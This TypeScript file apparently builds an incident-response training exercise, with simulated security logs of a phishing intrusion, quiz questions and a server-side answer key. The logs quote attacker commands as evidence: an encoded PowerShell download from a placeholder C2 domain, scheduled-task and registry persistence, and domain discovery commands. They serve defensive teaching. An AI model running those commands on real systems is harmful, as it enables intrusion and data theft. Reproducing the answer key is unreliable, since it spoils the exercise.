/**
 * Operation Zero Hour — Phase 2: Investigation.
 *
 * A searchable evidence environment plus the eight findings the intern has to
 * reach from it. The records span authentication, endpoint, network, DNS, mail
 * and firewall, and include enough unrelated activity that filtering is a real
 * skill rather than a formality.
 *
 * Finding 1 is the one that decides the rest of the competition: the first
 * *confirmed malicious* event is the 08:41 mail delivery, not the 09:11
 * password spray that generated the first alert. The spray is louder, earlier
 * in the alert queue, and never worked.
 *
 * `evidenceRecords()` and `investigationQuestions()` are client-safe.
 * `investigationKey()` is not.
 */

import type { OzhEvidence } from "./ozh-evidence";
import type { FindingKey } from "@/lib/ozh-engine";

export type EvidenceCategory =
  | "EMAIL"
  | "ENDPOINT"
  | "AUTH"
  | "NETWORK"
  | "DNS"
  | "FIREWALL"
  | "FILE";

export type EvidenceRecord = {
  id: string;
  category: EvidenceCategory;
  at: string;
  source: string;
  host: string;
  user: string;
  summary: string;
  detail: string;
};

/**
 * The evidence set.
 *
 * Ordered by record id rather than time so the console's default view does not
 * hand the intern the chronology for free — reconstructing it is Phase 4.
 */
export function evidenceRecords(e: OzhEvidence): EvidenceRecord[] {
  return [
    {
      id: "EV-AUTH-01",
      category: "AUTH",
      at: "09:11",
      source: "VPN Gateway",
      host: e.vpnGateway,
      user: e.sprayTarget,
      summary: `${e.sprayAttempts} failed VPN authentications from ${e.sprayIp}`,
      detail: `Password spray against a single account.
result=FAIL ×${e.sprayAttempts}  successful=0
account locked out 09:16:58 after threshold reached
src=${e.sprayIp}  geo=unattributed hosting range
No session was established from this address at any point on this date.`,
    },
    {
      id: "EV-AUTH-02",
      category: "AUTH",
      at: "09:34",
      source: "Windows Security Log",
      host: e.victimHost,
      user: e.svcAccount,
      summary: `Credential material for ${e.svcAccount} recovered from memory`,
      detail: `LSASS read by ${e.stagerName} at 09:34:47.
${e.svcAccount} had an interactive session cached on this host from a
software deployment run three days earlier — the credential should never
have been resident on a workstation.`,
    },
    {
      id: "EV-AUTH-03",
      category: "AUTH",
      at: "10:02",
      source: "Windows Security Log",
      host: e.fileServer,
      user: e.svcAccount,
      summary: `4624 Type 3 logon to ${e.fileServer} sourced from ${e.victimHost}`,
      detail: `Account=${e.svcAccount}  LogonType=3  AuthPackage=NTLM
Source workstation=${e.victimHost}
Prior 90-day baseline for this account: 0 logons sourced from any workstation.`,
    },
    {
      id: "EV-AUTH-04",
      category: "AUTH",
      at: "08:13",
      source: "Active Directory",
      host: "WS-058",
      user: "k.brennan",
      summary: "Six failed logons followed by success after a password change",
      detail: `pwdLastSet 2026-08-06 17:44. Mapped drive retried a cached
credential six times before the user re-authenticated. Unrelated to this
incident.`,
    },
    {
      id: "EV-AUTH-05",
      category: "AUTH",
      at: "09:41",
      source: "Windows Security Log",
      host: e.dbServer,
      user: "t.sorensen-adm",
      summary: "Authorised WinRM session during an approved patch window",
      detail: `CHG-2026-0802, patch verification 09:30–10:30. Sessions to
${e.dbServer}, WEB-01 and MAIL-GW-01. Commands read hotfix state only.`,
    },
    {
      id: "EV-MAIL-01",
      category: "EMAIL",
      at: "08:41",
      source: "Mail Gateway",
      host: "MAIL-GW-01",
      user: e.victimUser,
      summary: `Macro-enabled attachment ${e.attachment} delivered from ${e.phishDomain}`,
      detail: `From: ${e.phishSender}
To: ${e.victimEmail}
Subject: Q3 reconciliation — signed off, please confirm
Attachment: ${e.attachment}  SHA256=${e.macroHash}
spf=fail  dkim=none  dmarc=fail
Sender domain registered 2026-08-03, nine days before delivery.
Disposition: DELIVERED — the domain was not on any block list.`,
    },
    {
      id: "EV-MAIL-02",
      category: "EMAIL",
      at: "08:44",
      source: "Mail Gateway",
      host: "MAIL-GW-01",
      user: "—",
      summary: `Eleven further messages from ${e.phishDomain} quarantined`,
      detail: `Same sender domain, same attachment hash, eleven other Aegis
recipients. All quarantined on attachment type. Only the ${e.victimUser}
message was released — the recipient had an allow-list entry for
accounts-payable correspondence.`,
    },
    {
      id: "EV-ENDP-01",
      category: "ENDPOINT",
      at: "08:47",
      source: "EDR — Sysmon",
      host: e.victimHost,
      user: e.victimUser,
      summary: "EXCEL.EXE spawned an encoded PowerShell command",
      detail: `ParentImage=EXCEL.EXE
Image=powershell.exe
CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBq...
Decoded: IEX(New-Object Net.WebClient).DownloadFile('https://${e.c2Domain}/a',
'${e.stagerPath}')`,
    },
    {
      id: "EV-ENDP-02",
      category: "ENDPOINT",
      at: "08:49",
      source: "EDR — Sysmon",
      host: e.victimHost,
      user: e.victimUser,
      summary: `${e.stagerName} written to the user temp directory`,
      detail: `TargetFilename=${e.stagerPath}
SHA256=${e.macroHash}
Signature: UNSIGNED. No prevalence in the estate before this date.`,
    },
    {
      id: "EV-ENDP-03",
      category: "ENDPOINT",
      at: "09:26",
      source: "EDR — Sysmon",
      host: e.victimHost,
      user: e.victimUser,
      summary: `Scheduled task "${e.taskName}" registered for onlogon execution`,
      detail: `schtasks /create /tn "${e.taskName}" /tr "${e.stagerPath}"
/sc onlogon /rl highest
Named to resemble a vendor updater. No corresponding change record.`,
    },
    {
      id: "EV-ENDP-04",
      category: "ENDPOINT",
      at: "09:47",
      source: "EDR — Sysmon",
      host: e.victimHost,
      user: e.victimUser,
      summary: "Built-in discovery commands run in sequence",
      detail: `09:47:02  net group "Domain Admins" /domain
09:47:19  net view \\\\${e.fileServer}
09:47:41  nltest /dclist:aegisfinancial
09:48:03  net share
All executed by ${e.stagerName}, not by an interactive shell.`,
    },
    {
      id: "EV-ENDP-05",
      category: "ENDPOINT",
      at: "10:31",
      source: "EDR — Registry Monitor",
      host: e.fileServer,
      user: e.svcAccount,
      summary: "Second autorun mechanism established on the file server",
      detail: `TargetObject=${e.runKeyPath}
Details=C:\\Windows\\Temp\\${e.stagerName}
This is a separate persistence mechanism from the scheduled task on
${e.victimHost}. Removing one does not remove the other.`,
    },
    {
      id: "EV-ENDP-06",
      category: "ENDPOINT",
      at: "06:00",
      source: "IDS",
      host: "SEC-SCAN-01",
      user: "svc-scanner",
      summary: "Weekly authenticated vulnerability scan",
      detail: `Full port sweep of three server subnets. Owned by Security
Engineering, scheduled Mondays 06:00. Expected activity.`,
    },
    {
      id: "EV-FILE-01",
      category: "FILE",
      at: "10:19",
      source: "File Server Audit",
      host: e.fileServer,
      user: e.svcAccount,
      summary: `${e.archiveName} assembled from client data shares`,
      detail: `TargetFilename=${e.archivePath}  Size=${e.archiveSizeMb} MB
Source paths: \\\\${e.fileServer}\\ClientData\\, \\\\${e.fileServer}\\Ledgers\\
Approximately ${e.recordCount.toLocaleString()} client records staged.`,
    },
    {
      id: "EV-FILE-02",
      category: "FILE",
      at: "02:14",
      source: "File Server Audit",
      host: e.fileServer,
      user: e.svcAccount,
      summary: "Nightly full backup read 48,201 objects",
      detail: `Veeam NightlyBackup-Full, CHG-2026-0771, recurring approval.
Same service account as the malicious activity later that morning, seven
hours earlier and entirely legitimate.`,
    },
    {
      id: "EV-NET-01",
      category: "NETWORK",
      at: "09:03",
      source: "Netflow",
      host: e.victimHost,
      user: e.victimUser,
      summary: `Periodic outbound sessions to ${e.c2Ip}:${e.c2Port}`,
      detail: `dst=${e.c2Ip}:${e.c2Port}  proto=TCP/TLS
Interval 60s ±4s jitter, 1.2 KB per beacon.
First observed 09:03:12. Destination resolves from ${e.c2Domain}.`,
    },
    {
      id: "EV-NET-02",
      category: "NETWORK",
      at: "10:02",
      source: "Netflow",
      host: e.victimHost,
      user: e.svcAccount,
      summary: `SMB session ${e.victimHost} → ${e.fileServer}`,
      detail: `dst_port=445  bytes_out=41 MB  bytes_in=${e.archiveSizeMb} MB
Admin share access followed by a large inbound transfer to the workstation.`,
    },
    {
      id: "EV-DNS-01",
      category: "DNS",
      at: "10:44",
      source: "DNS Resolver",
      host: e.victimHost,
      user: e.victimUser,
      summary: `${e.dnsQueryCount.toLocaleString()} TXT queries to subdomains of ${e.c2Domain}`,
      detail: `query_type=TXT  window=10:44–11:22
Encoded labels averaging 48 characters, high entropy.
Estimated payload carried: ${e.exfilMb} MB.
Host baseline: 31 TXT queries per day.`,
    },
    {
      id: "EV-DNS-02",
      category: "DNS",
      at: "08:47",
      source: "DNS Resolver",
      host: e.victimHost,
      user: e.victimUser,
      summary: `First resolution of ${e.c2Domain}`,
      detail: `A record → ${e.c2Ip}
Domain age at time of query: 9 days.
No other host in the estate has resolved this name.`,
    },
    {
      id: "EV-FW-01",
      category: "FIREWALL",
      at: "11:02",
      source: "Perimeter Firewall",
      host: "WEB-01",
      user: "—",
      summary: "Outbound connection to a threat-intel listed host denied",
      detail: `dst=198.18.55.11:8080  action=DENY  bytes_transferred=0
Three attempts, all blocked. Unrelated infrastructure to ${e.c2Ip}.`,
    },
    {
      id: "EV-FW-02",
      category: "FIREWALL",
      at: "09:03",
      source: "Perimeter Firewall",
      host: e.victimHost,
      user: "—",
      summary: `Outbound TLS to ${e.c2Ip} permitted`,
      detail: `action=ALLOW  rule=OUTBOUND-WEB-DEFAULT
${e.c2Ip} was not on any block list at the time of the connection.
Session count from 09:03 to 11:22: 138.`,
    },
  ];
}

export type InvestigationQuestion = {
  id: string;
  question: string;
  /** Rendered as a picker. Exactly one option is correct. */
  options: string[];
};

/** Client-safe. Option order is fixed so it is stable across renders. */
export function investigationQuestions(e: OzhEvidence): InvestigationQuestion[] {
  return [
    {
      id: "first-malicious",
      question: "Which evidence record is the first confirmed malicious event?",
      options: ["EV-AUTH-01", "EV-MAIL-01", "EV-ENDP-01", "EV-NET-01", "EV-DNS-02"],
    },
    {
      id: "initial-access",
      question: "What was the initial access vector?",
      options: [
        "VPN credential compromise via password spray",
        "Phishing email with a macro-enabled attachment",
        "Exploitation of the public web server",
        "Compromised third-party supplier account",
        "Malicious insider with existing access",
      ],
    },
    {
      id: "patient-zero",
      question: "Which host was compromised first?",
      options: [e.vpnGateway, e.victimHost, e.fileServer, "WEB-01", e.dcHost],
    },
    {
      id: "compromised-user",
      question: "Whose account was compromised at the point of entry?",
      options: [e.sprayTarget, e.victimUser, e.svcAccount, "t.sorensen-adm", "k.brennan"],
    },
    {
      id: "spray-outcome",
      question: `Did the password spray against ${e.vpnGateway} succeed?`,
      options: [
        "Yes — it produced the attacker's initial foothold",
        "Yes — it compromised the service account used later",
        "No — every attempt failed and the account locked out",
        "Inconclusive — the VPN logs do not record outcomes",
      ],
    },
    {
      id: "c2-address",
      question: "Which address is the command-and-control server?",
      options: [e.c2Ip, e.sprayIp, "198.18.55.11", "10.40.12.19"],
    },
    {
      id: "c2-domain",
      question: "Which domain does the implant beacon to?",
      options: [e.c2Domain, e.phishDomain, "portal.aegisfinancial.com", "aegisfinancial.com"],
    },
    {
      id: "exfil-channel",
      question: "How was data moved out of the estate?",
      options: [
        "HTTPS POST to the C2 web server",
        "DNS TXT record tunnelling",
        "SMB copy to an external share",
        "Webmail attachment from the compromised mailbox",
      ],
    },
  ];
}

/** Answer key. Server-side only. */
export function investigationKey(e: OzhEvidence): FindingKey[] {
  return [
    {
      id: "first-malicious",
      question: "First confirmed malicious event",
      // The 08:41 delivery precedes the 09:11 spray by half an hour and is the
      // event the rest of the chain actually descends from.
      accept: ["EV-MAIL-01"],
    },
    {
      id: "initial-access",
      question: "Initial access vector",
      accept: ["Phishing email with a macro-enabled attachment"],
    },
    { id: "patient-zero", question: "Patient zero", accept: [e.victimHost] },
    { id: "compromised-user", question: "Compromised user at entry", accept: [e.victimUser] },
    {
      id: "spray-outcome",
      question: "Outcome of the password spray",
      accept: ["No — every attempt failed and the account locked out"],
    },
    { id: "c2-address", question: "C2 address", accept: [e.c2Ip] },
    { id: "c2-domain", question: "C2 domain", accept: [e.c2Domain] },
    { id: "exfil-channel", question: "Exfiltration channel", accept: ["DNS TXT record tunnelling"] },
  ];
}
